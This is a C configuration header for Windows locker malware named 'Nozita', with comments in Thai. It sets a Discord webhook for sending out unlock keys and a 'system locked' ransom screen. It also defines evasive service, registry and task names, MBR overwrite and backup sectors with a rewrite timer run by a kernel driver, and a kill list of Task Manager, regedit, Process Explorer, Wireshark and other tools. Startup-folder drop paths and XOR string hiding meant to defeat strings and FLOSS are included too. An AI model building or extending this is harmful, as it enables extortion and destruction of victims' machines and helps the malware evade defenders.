#pragma once

// ╔══════════════════════════════════════════════════════════╗
// ║              NOZITA CONFIG — แก้ไขที่นี่ที่เดียว          ║
// ╚══════════════════════════════════════════════════════════╝

// ── Webhook Discord ──────────────────────────────────────────
// วาง URL webhook ของคุณตรงนี้
#define CFG_WEBHOOK "https://discord.com/api/webhooks/XXXXXXXXXX/XXXXXXXXXX"

// ── รหัสปลดล็อค ──────────────────────────────────────────────
// ถ้าต้องการกำหนดรหัสเอง ให้เปลี่ยน CFG_KEY_MODE เป็น 0
// และใส่รหัสใน CFG_STATIC_KEY
// ถ้าต้องการสุ่มอัตโนมัติ (แนะนำ) ให้ใช้ CFG_KEY_MODE 1
#define CFG_KEY_MODE   1              // 0 = กำหนดเอง, 1 = สุ่มอัตโนมัติ
#define CFG_STATIC_KEY "MyPassword123"// ใช้เฉพาะเมื่อ CFG_KEY_MODE = 0
#define CFG_KEY_LENGTH 16             // ความยาวรหัสสุ่ม (ใช้เมื่อ MODE = 1)

// ── ข้อความบนหน้าจอล็อค ──────────────────────────────────────
#define CFG_LOCK_TITLE "NOZITA SYSTEM LOCKED"
#define CFG_LOCK_DESC  "เครื่องของคุณถูกล็อก\r\nใส่รหัสปลดล็อกที่ได้รับเท่านั้น"
#define CFG_UNLOCK_BTN "UNLOCK"

// ── ชื่อ service / task / registry (เปลี่ยนเพื่อ evasion) ──────
#define CFG_APP_NAME   "NozitaGuard"
#define CFG_EXE_NAME   "nozita_system.exe"
#define CFG_REG_KEY    "NozitaSystemLocker"
#define CFG_TASK_NAME  "NozitaSystemGuard"
#define CFG_HASH_KEY   "NozitaHash"
#define CFG_DRV_SVC    L"NozitaDrv"

// ── สี UI ─────────────────────────────────────────────────────
#define CFG_BG_COLOR   RGB(10, 10, 20)     // พื้นหลัง
#define CFG_TXT_COLOR  RGB(220, 220, 255)  // ตัวอักษร
#define CFG_ED_COLOR   RGB(25, 8, 45)      // กล่องรหัส

// ── Disk layout (อย่าเปลี่ยนถ้าไม่แน่ใจ) ────────────────────
#define CFG_PAYLOAD_LBA     128ULL  // sector เริ่มเก็บ payload
#define CFG_PAYLOAD_SECTORS 256ULL  // จำนวน sector (256*512 = 128KB)
#define CFG_MBR_BACKUP_SEC  62      // sector สำรอง original MBR

// ── Process kill list (เพิ่ม/ลบได้) ─────────────────────────
// สำหรับ main.c (user-mode killer thread)
#define CFG_KILL_LIST {"taskmgr.exe","regedit.exe","cmd.exe",\
    "powershell.exe","powershell_ise.exe","procexp.exe","procexp64.exe",\
    "procmon.exe","procmon64.exe","msconfig.exe","mmc.exe",\
    "autoruns.exe","autoruns64.exe","wireshark.exe",NULL}

// สำหรับ drv.c (kernel-mode block list) — แก้ใน drv.c โดยตรง
// เพราะใช้ RTL_CONSTANT_STRING ซึ่งต้องเป็น literal

// ── EFI drop paths ────────────────────────────────────────────
#define CFG_EFI_EXE_PATH L"\\Users\\Public\\nozita_s.exe"
#define CFG_EFI_BAT_PATH L"\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nz.bat"

// ── Timing ───────────────────────────────────────────────────
#define CFG_KILLER_INTERVAL_MS  500  // ms ระหว่างรอบ kill (main.c)
#define CFG_MBR_REWRITE_SEC     10   // วิ ระหว่าง MBR re-write (drv.c)
// ── XOR string encryption ────────────────────────────────────
// ── XOR string encryption ────────────────────────────────────
// ซ่อน string literals ไม่ให้ strings.exe / FLOSS เห็น
#define XK 0xAB  // XOR key — เปลี่ยนได้
